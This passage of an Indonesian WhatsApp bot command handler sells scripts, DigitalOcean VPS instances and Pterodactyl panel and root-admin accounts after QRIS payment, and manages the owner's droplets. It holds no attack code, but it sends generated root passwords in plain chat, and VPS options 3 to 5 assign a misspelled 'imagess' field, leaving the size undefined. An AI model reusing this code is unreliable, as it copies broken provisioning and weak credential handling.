let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Xyro.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List script bot yang tersedia*

*1. Simple Bot V3*
* *Type :* Case X Plugins
* *Size File :* 1mb
* *Harga :* Rp35.000

*2. Pushkontak Simpel*
* *Type :* Case
* *Size File :* 909kb
* *Harga :* Rp25.000

Contoh Penggunaan : *.buysc* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V3"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "25000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xyro.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List paket vps yang tersedia*
 
*1.* Ram 1 & Cpu 1
*Harga Rp20.000*

*2.* Ram 2 & Cpu 1
*Harga Rp25.000*

*3.* Ram 2 & Cpu 2
*Harga Rp30.000*

*4.* Ram 4 & Cpu 2
*Harga Rp40.000*

*5.* Ram 8 & Cpu 4
*Harga Rp50.000*

*6.* Ram 16 & Cpu 4
*Harga Rp70.000*

 Contoh penggunaan : *.buyvps* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-1gb"
    Obj.harga = "20000"
    } else if (tek == "2") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "3") {
    Obj.imagess = "s-2vcpu-2gb"
    Obj.harga = "30000"
    } else if (tek == "4") {
    Obj.imagess = "s-2vcpu-4gb"
    Obj.harga = "40000"
    } else if (tek == "5") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "50000"
    } else if (tek == "6") {
    Obj.images = "s-4vcpu-16gb-amd"
    Obj.harga = "70000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xyro.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-22-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Xyro.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "buypanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xyro.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 14 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(orang, {text: tekspanel}, {quoted: null})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": case "buyadminpanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return m.reply(example("username"))
if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!")
let us = crypto.randomBytes(2).toString('hex')
let Obj = {}
Obj.harga = "15000" 
Obj.username = text.toLowerCase() + us
const UrlQr = global.qrisOrderKuota



const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xyro.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Grub Adp :* https://chat.whatsapp.com/JkQe8I30nMsLF2v0CDKKyK
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Wajib Masuk Grub Adp
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 14 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null})
await Xyro.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Xyro.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Xyro.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Xyro.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-22-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Xyro.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "syd1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-22-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
